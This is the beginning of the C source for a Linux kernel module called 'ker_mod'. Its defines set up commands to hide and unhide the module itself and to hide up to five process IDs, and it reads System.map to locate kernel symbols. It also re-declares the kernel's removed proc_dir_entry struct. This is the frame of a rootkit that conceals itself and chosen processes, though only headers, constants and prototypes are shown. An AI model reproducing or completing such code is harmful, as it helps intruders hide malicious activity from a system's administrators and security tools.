#include <linux/module.h>
#include <linux/proc_fs.h>
#include <asm/paravirt.h>
#include <asm/uaccess.h>
#include <linux/kernel.h>
#include <linux/kobject.h>
#include <linux/init.h>
#include <linux/unistd.h>
#include <linux/fs.h>
#include <linux/slab.h>     /* kmalloc */
#include <linux/syscalls.h>

/* WTF, it compiles without these */
//#include <linux/string.h>
//#include <linux/proc_ns.h>
//#include <linux/spinlock.h>
//#include <linux/atomic.h>
//#include <linux/binfmts.h>
//#include <linux/cred.h>

MODULE_LICENSE("GPL");

#define MODULE_NAME "ker_mod"
#define MAX_HIDDEN_PIDS 5
#define MAX_PID_LENGTH 6

#define HIDE_MOD_CMD "hide"
#define SHOW_MOD_CMD "show"
#define HIDE_PID_CMD "hpid"
#define SHOW_PID_CMD "spid"

#define PROC_V "/proc/version"
#define BOOT_PATH "/boot/System.map-"
#define MAX_VERSION_LEN   256

/* Re-writing proc_dir_entry, removed from Linux kernel since 3.10 */
struct proc_dir_entry {
		unsigned int low_ino;
		umode_t mode;
		nlink_t nlink;
		kuid_t uid;
		kgid_t gid;
		loff_t size;
		const struct inode_operations *proc_iops;
		const struct file_operations *proc_fops;
		struct proc_dir_entry *parent;
		struct rb_root subdir;
		struct rb_node subdir_node;
		void *data;
		atomic_t count;
		atomic_t in_use;
		struct completion *pde_unload_completion;
		struct list_head pde_openers;
		spinlock_t pde_unload_lock;
		u8 namelen;
		char name[];
};

static int procfs_init(void);
void module_hide(void);
void module_show(void);
